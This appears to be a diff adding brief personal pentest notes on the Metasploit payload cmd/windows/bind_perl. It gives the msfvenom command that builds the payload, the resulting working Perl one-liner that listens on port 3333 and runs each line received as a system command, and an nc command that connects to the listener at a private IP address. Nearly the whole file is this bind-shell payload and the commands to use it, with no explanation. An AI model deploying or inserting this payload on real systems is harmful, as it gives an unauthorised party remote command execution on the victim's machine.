@@ -1,0 +1,29 @@
+cmd/windows/bind_perl
+
+
+msfvenom.bat -p cmd/windows/bind_perl LPORT=3333
+
+
+perl -MIO -e "while($c=new IO::Socket::INET(LocalPort,3333,Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}"
+
+nc 192.168.138.140 3333
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
